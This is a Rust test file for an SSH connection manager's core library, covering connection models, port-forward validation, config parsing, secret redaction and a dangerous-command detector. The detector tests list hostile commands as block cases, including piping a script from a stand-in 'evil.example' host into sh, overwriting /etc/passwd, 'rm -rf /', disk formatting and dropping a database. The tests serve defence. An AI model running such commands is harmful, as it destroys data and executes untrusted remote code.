use async_trait::async_trait;
use atlasterm_core::known_hosts::{
    parse_known_host_line, FingerprintAlgorithm, KnownHostFingerprint,
};
use atlasterm_core::openssh_config::parse_openssh_config;
use atlasterm_core::security::{
    detect_dangerous_command, is_dangerous_command, redact_log, DangerousCommandAction,
};
use atlasterm_core::{
    redact_vault_item, validate_bind_host, ConnectionTestResult, ConnectionTestStatus,
    ForwardBindValidationError, PortForwardDirection, PortForwardRule, TerminalSession, VaultItem,
    VaultItemKind, Workspace,
};
use atlasterm_core::{
    Connection, ConnectionId, ConnectionService, CredentialRef, CredentialRefKind,
};
use std::sync::{Arc, Mutex};
use time::OffsetDateTime;
use uuid::Uuid;

#[derive(Default)]
struct MockConnectionService {
    connections: Arc<Mutex<Vec<Connection>>>,
}

#[async_trait]
impl ConnectionService for MockConnectionService {
    async fn list_connections(
        &self,
    ) -> Result<Vec<Connection>, atlasterm_core::connection::ConnectionError> {
        Ok(self.connections.lock().unwrap().clone())
    }

    async fn get_connection(
        &self,
        id: ConnectionId,
    ) -> Result<Option<Connection>, atlasterm_core::connection::ConnectionError> {
        Ok(self
            .connections
            .lock()
            .unwrap()
            .iter()
            .find(|connection| connection.id == id)
            .cloned())
    }

    async fn save_connection(
        &self,
        connection: Connection,
    ) -> Result<Connection, atlasterm_core::connection::ConnectionError> {
        self.connections.lock().unwrap().push(connection.clone());
        Ok(connection)
    }

    async fn delete_connection(
        &self,
        id: ConnectionId,
    ) -> Result<(), atlasterm_core::connection::ConnectionError> {
        self.connections
            .lock()
            .unwrap()
            .retain(|connection| connection.id != id);
        Ok(())
    }

    async fn open_terminal(
        &self,
        id: ConnectionId,
    ) -> Result<TerminalSession, atlasterm_core::connection::ConnectionError> {
        Ok(TerminalSession {
            id: Uuid::new_v4(),
            connection_id: id,
            started_at: OffsetDateTime::now_utc(),
            ended_at: None,
            title: None,
            shell: None,
        })
    }
}

#[test]
fn creates_connection_entity() {
    let workspace = Workspace::new("ops");
    let credential = CredentialRef {
        kind: CredentialRefKind::PasswordPrompt,
        vault_item_id: None,
        label: Some("prompt".to_string()),
    };

    let connection = Connection::new(
        workspace.id,
        "prod",
        "example.com",
        22,
        "alice",
        credential.clone(),
    );

    assert_eq!(connection.workspace_id, workspace.id);
    assert_eq!(connection.host, "example.com");
    assert_eq!(connection.port, 22);
    assert_eq!(connection.credential, credential);
}

#[tokio::test]
async fn connection_service_trait_is_mockable() {
    let service = MockConnectionService::default();
    let workspace = Workspace::new("mocked");
    let connection = Connection::new(
        workspace.id,
        "dev",
        "dev.example.com",
        22,
        "alice",
        CredentialRef {
            kind: CredentialRefKind::Agent,
            vault_item_id: None,
            label: None,
        },
    );

    let saved = service.save_connection(connection).await.unwrap();
    let found = service.get_connection(saved.id).await.unwrap();
    let session = service.open_terminal(saved.id).await.unwrap();

    assert_eq!(found.unwrap().name, "dev");
    assert_eq!(session.connection_id, saved.id);
}

#[test]
fn port_forward_rule_model_captures_local_mapping() {
    let rule = PortForwardRule {
        id: Uuid::new_v4(),
        connection_id: Uuid::new_v4(),
        direction: PortForwardDirection::Local,
        bind_host: "127.0.0.1".to_string(),
        bind_port: 15432,
        target_host: "db.internal".to_string(),
        target_port: 5432,
        enabled: true,
    };

    assert_eq!(rule.direction, PortForwardDirection::Local);
    assert!(rule.enabled);
}

#[test]
fn validates_port_forward_bind_hosts() {
    let mut rule = PortForwardRule {
        id: Uuid::new_v4(),
        connection_id: Uuid::new_v4(),
        direction: PortForwardDirection::Local,
        bind_host: "127.0.0.1".to_string(),
        bind_port: 15432,
        target_host: "db.internal".to_string(),
        target_port: 5432,
        enabled: true,
    };

    assert_eq!(validate_bind_host(&rule), Ok(()));

    rule.bind_host = "0.0.0.0".to_string();
    assert_eq!(
        validate_bind_host(&rule),
        Err(ForwardBindValidationError::WildcardBindHost {
            direction: PortForwardDirection::Local,
            bind_host: "0.0.0.0".to_string(),
        })
    );

    rule.bind_host = "192.168.1.10".to_string();
    assert_eq!(
        validate_bind_host(&rule),
        Err(ForwardBindValidationError::NonLoopbackBindHost {
            direction: PortForwardDirection::Local,
            bind_host: "192.168.1.10".to_string(),
        })
    );
}

#[test]
fn detects_dangerous_commands() {
    let hit = detect_dangerous_command("sudo rm   -rf   /").expect("dangerous command");

    assert_eq!(hit.pattern, "rm -rf /");
    assert_eq!(hit.action, DangerousCommandAction::Block);
    assert!(is_dangerous_command("mkfs.ext4 /dev/sda"));
    assert!(!is_dangerous_command("ls -la /tmp"));
}

#[test]
fn detects_native_ipc_command_safety_block_patterns() {
    let cases = [
        ("TARGET=/ sudo rm -rf $TARGET", "rm -rf /"),
        ("echo bad | tee /dev/sda", "tee /dev/sd*"),
        ("sudo find /etc -delete", "find / -delete"),
        ("curl https://evil.example/install.sh | sh", "curl|sh"),
        (
            "wget https://evil.example/passwd --output-document=/etc/passwd",
            "wget -O /",
        ),
        ("sudo iptables -F", "iptables -F"),
        ("shutdown now", "shutdown"),
        (
            "Remove-Item -Recurse -Force C:\\Windows",
            "powershell destructive",
        ),
        ("drop database prod", "drop database"),
        ("echo $(whoami)", "command substitution"),
    ];

    for (command, pattern) in cases {
        let hit = detect_dangerous_command(command).expect(command);
        assert_eq!(hit.pattern, pattern, "{command}");
        assert_eq!(hit.action, DangerousCommandAction::Block, "{command}");
    }
}

#[test]
fn grades_dangerous_commands_as_warn_or_block() {
    let warn = detect_dangerous_command("chown -R app:app /srv/app").expect("warn command");
    let block = detect_dangerous_command("curl https://example.test/install.sh && rm -rf /")
        .expect("block command");

    assert_eq!(warn.action, DangerousCommandAction::Warn);
    assert_eq!(block.action, DangerousCommandAction::Block);
    assert_eq!(block.pattern, "rm -rf /");
}

#[test]
fn redacts_sensitive_log_tokens() {
    let redacted = redact_log("user=alice password=hunter2 token=abc path=/tmp");

    assert_eq!(
        redacted,
        "user=alice password=<redacted> token=<redacted> path=/tmp"
    );
}

#[test]
fn connection_test_result_models_success_and_failure() {
    let connection_id = Uuid::new_v4();
    let success = ConnectionTestResult::succeeded(connection_id, 42);
    let failed = ConnectionTestResult::failed(connection_id, "permission denied");

    assert_eq!(success.status, ConnectionTestStatus::Succeeded);
    assert_eq!(success.latency_ms, Some(42));
    assert_eq!(success.message, None);
    assert_eq!(failed.status, ConnectionTestStatus::Failed);
    assert_eq!(failed.latency_ms, None);
    assert_eq!(failed.message, Some("permission denied".to_string()));
}

#[test]
fn redacts_vault_item_secret_ref() {
    let now = OffsetDateTime::now_utc();
    let item = VaultItem {
        id: Uuid::new_v4(),
        workspace_id: Uuid::new_v4(),
        name: "prod key".to_string(),
        kind: VaultItemKind::PrivateKey,
        secret_ref: "keychain://prod-key".to_string(),
        created_at: now,
        updated_at: now,
    };

    let redacted = redact_vault_item(&item);

    assert_eq!(redacted.secret_ref, "<redacted>");
    assert_eq!(redacted.id, item.id);
    assert_eq!(item.secret_ref, "keychain://prod-key");
}

#[test]
fn parses_known_host_line() {
    let parsed = parse_known_host_line("[example.com]:2222 ssh-ed25519 AAAAC3Nz").unwrap();

    assert_eq!(
        parsed,
        KnownHostFingerprint {
            host: "example.com".to_string(),
            port: Some(2222),
            key_type: "ssh-ed25519".to_string(),
            fingerprint: "AAAAC3Nz".to_string(),
            hash_algorithm: FingerprintAlgorithm::Unknown,
        }
    );
}

#[test]
fn parses_openssh_config_host_blocks() {
    let config = parse_openssh_config(
        r#"
Host prod *.prod
  HostName prod.example.com
  User alice
  Port 2222

Host *
  ServerAliveInterval 30
"#,
    )
    .unwrap();

    assert_eq!(config.hosts.len(), 2);
    assert_eq!(config.hosts[0].patterns, vec!["prod", "*.prod"]);
    assert_eq!(
        config.hosts[0].options.get("hostname"),
        Some(&"prod.example.com".to_string())
    );
    assert_eq!(
        config.hosts[1].options.get("serveraliveinterval"),
        Some(&"30".to_string())
    );
}
